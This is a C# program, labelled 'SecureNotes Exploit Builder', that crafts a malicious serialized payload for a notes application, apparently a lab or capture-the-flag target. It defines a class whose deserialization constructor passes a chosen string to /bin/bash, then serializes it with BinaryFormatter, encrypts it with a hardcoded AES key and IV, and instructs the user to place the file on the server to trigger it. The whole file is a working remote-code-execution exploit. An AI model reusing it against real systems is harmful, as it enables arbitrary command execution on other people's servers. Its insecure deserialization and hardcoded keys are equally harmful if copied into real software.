using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Diagnostics;

namespace SecureNotes
{
    [Serializable]
    public class NoteMetadata : ISerializable
    {
        public string Author { get; set; }
        public int Version { get; set; }
        private string command;

        public NoteMetadata()
        {
        }

        public NoteMetadata(string cmd)
        {
            command = cmd;
        }

        protected NoteMetadata(SerializationInfo info, StreamingContext context)
        {
            Author = info.GetString("Author");
            Version = info.GetInt32("Version");
            command = info.GetString("Command");

            ExecuteCommand(command);
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.AddValue("Author", Author);
            info.AddValue("Version", Version);
            info.AddValue("Command", command);
        }

        static void ExecuteCommand(string cmd)
        {
            try
            {
                Process proc = new Process();
                proc.StartInfo.FileName = "/bin/bash";
                proc.StartInfo.Arguments = $"-c \"{cmd}\"";
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.StartInfo.UseShellExecute = false;
                proc.Start();

                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();

                proc.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                    Console.WriteLine(output);

                if (!string.IsNullOrEmpty(error))
                    Console.Error.WriteLine(error);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }

    class Program
    {
        private static readonly byte[] Key = Encoding.UTF8.GetBytes("MySecureKey12345MySecureKey12345");
        private static readonly byte[] IV = Encoding.UTF8.GetBytes("MySecureIV123456");

        static void Main(string[] args)
        {
            Console.WriteLine("=================================");
            Console.WriteLine("  SecureNotes Exploit Builder");
            Console.WriteLine("=================================");
            Console.WriteLine();

            Console.Write("Command to execute: ");
            string command = Console.ReadLine();

            Console.Write("Output filename: ");
            string filename = Console.ReadLine();

            BuildExploit(command, filename);

            Console.WriteLine($"\n[+] Exploit saved to {filename}");
            Console.WriteLine($"[+] Copy to server/notes/ and load it");
        }

        static void BuildExploit(string command, string filename)
        {
            NoteMetadata payload = new NoteMetadata(command)
            {
                Author = "Attacker",
                Version = 1
            };

            BinaryFormatter formatter = new BinaryFormatter();
            byte[] serialized;

            using (MemoryStream ms = new MemoryStream())
            {
                formatter.Serialize(ms, payload);
                serialized = ms.ToArray();
            }

            byte[] encrypted = EncryptAES(serialized);
            File.WriteAllBytes(filename, encrypted);
        }

        static byte[] EncryptAES(byte[] data)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Key;
                aes.IV = IV;

                ICryptoTransform encryptor = aes.CreateEncryptor();
                return encryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }
    }
}